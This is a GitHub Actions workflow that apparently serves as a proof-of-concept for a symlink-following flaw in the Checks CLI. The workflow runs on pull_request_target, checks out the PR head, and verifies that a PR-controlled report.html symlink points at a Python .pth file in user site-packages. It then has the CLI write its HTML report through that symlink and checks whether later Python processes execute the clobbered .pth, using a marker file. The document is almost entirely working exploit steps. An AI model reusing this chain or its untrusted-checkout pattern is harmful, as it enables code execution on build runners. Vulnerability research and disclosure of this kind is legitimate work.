name: T1 Python PTH Output Symlink Proof

on:
  pull_request_target:
    types: [opened, synchronize, reopened]

permissions:
  contents: read
  pull-requests: read

jobs:
  python-pth-output-symlink:
    if: >-
      github.event.pull_request.head.repo.full_name == 'cllc3993/checks-s1-ci-impact-poc' &&
      startsWith(github.event.pull_request.head.ref, 'accountb-python-pth-')
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR head
        uses: actions/checkout@v4
        with:
          repository: ${{ github.event.pull_request.head.repo.full_name }}
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Prepare Python user-site target
        shell: bash
        run: |
          set -euo pipefail
          test -d scan-root
          test -f scan-root/MainActivity.java
          test -L report.html
          actual_target="$(readlink report.html)"
          expected_target="../../../.local/lib/python3.12/site-packages/checks_t1_ci.pth"
          test "$actual_target" = "$expected_target"
          python3.12 --version
          user_site="$(python3.12 -c 'import site; print(site.getusersitepackages())')"
          test "$user_site" = "$HOME/.local/lib/python3.12/site-packages"
          mkdir -p "$user_site"
          printf 'TRUSTED_PTH_ORIGINAL_20260602\n' > "$user_site/checks_t1_ci.pth"
          printf 'attacker-output-symlink=%s -> %s\n' "report.html" "$actual_target"
          printf 'resolved-output-target=%s\n' "$(readlink -f report.html)"
          printf 'python-user-site=%s\n' "$user_site"
          printf 'pth-before-first-line=%s\n' "$(sed -n '1p' "$user_site/checks_t1_ci.pth")"

      - name: Install Checks CLI
        shell: bash
        run: |
          set -euo pipefail
          curl --compressed https://dl.google.com/checks/cli/latest/checks-linux -o checks
          chmod +x ./checks
          ./checks --version

      - name: Generate HTML report to PR-controlled PTH symlink
        shell: bash
        run: |
          set -euo pipefail
          ./checks code scan scan-root \
            --skip-upload \
            --format=html \
            --output report.html \
            --account-id=1 \
            --repo-id=1 \
            --scm-remote-url=https://github.com/claudeloba/checks-s1-ci-impact-poc \
            --branch-name=ci-python-pth-output-symlink \
            --scm-revision="T1_PYTHON_PTH_${GITHUB_RUN_ID}_${GITHUB_RUN_ATTEMPT}" \
            --disable-analytics \
            --disable-version-check \
            --no-input

      - name: Later Python process executes clobbered PTH
        shell: bash
        run: |
          set -euo pipefail
          target="$HOME/.local/lib/python3.12/site-packages/checks_t1_ci.pth"
          grep -q 'T1_PYTHON_PTH_CI_MARKER_20260602' "$target"
          printf 'pth-after-first-line=%s\n' "$(sed -n '1p' "$target")"
          env | sort | grep -E '^(HOME|PYTHON|RUNNER_)=' || true
          python3.12 - <<'PY'
          import os
          import site
          import sys
          print(f"python-enable-user-site={site.ENABLE_USER_SITE!r}")
          print(f"python-no-user-site-flag={sys.flags.no_user_site!r}")
          print(f"python-user-site={site.getusersitepackages()}")
          print(f"pythonpath-env={os.environ.get('PYTHONPATH')!r}")
          print(f"python-no-user-site-env={os.environ.get('PYTHONNOUSERSITE')!r}")
          print("python-sys-path-begin")
          for entry in sys.path:
              print(entry)
          print("python-sys-path-end")
          PY
          python3.12 - <<'PY'
          from pathlib import Path
          target = Path.home() / ".local/lib/python3.12/site-packages/checks_t1_ci.pth"
          for number, line in enumerate(target.read_text(errors="replace").splitlines(), 1):
              if "T1_PYTHON_PTH_CI_MARKER_20260602" in line or "import pathlib" in line:
                  print(f"pth-marker-line-{number}={line!r}")
          PY
          rm -f "$HOME/T1_PYTHON_PTH_CI_MARKER_20260602" "T1_PYTHON_PTH_CI_MARKER_20260602"
          python3.12 -c 'print("PYTHON_STARTED_AFTER_CHECKS")'
          if test -f "$HOME/T1_PYTHON_PTH_CI_MARKER_20260602" -o -f "T1_PYTHON_PTH_CI_MARKER_20260602"; then
            default_result=1
          else
            default_result=0
          fi
          rm -f "$HOME/T1_PYTHON_PTH_CI_MARKER_20260602" "T1_PYTHON_PTH_CI_MARKER_20260602"
          env -u PYTHONNOUSERSITE python3.12 -c 'print("PYTHON_STARTED_AFTER_CHECKS_ENV_UNSET")'
          if test -f "$HOME/T1_PYTHON_PTH_CI_MARKER_20260602" -o -f "T1_PYTHON_PTH_CI_MARKER_20260602"; then
            env_unset_result=1
          else
            env_unset_result=0
          fi
          test ! -f "$HOME/T1_PYTHON_PTH_CI_MARKER_20260602" || printf 'python-pth-marker-location=home\n'
          test ! -f "T1_PYTHON_PTH_CI_MARKER_20260602" || printf 'python-pth-marker-location=workspace\n'
          printf 'python-pth-default-result=%s\n' "$default_result"
          printf 'python-pth-env-unset-result=%s\n' "$env_unset_result"
          test "$default_result" = 1 -o "$env_unset_result" = 1
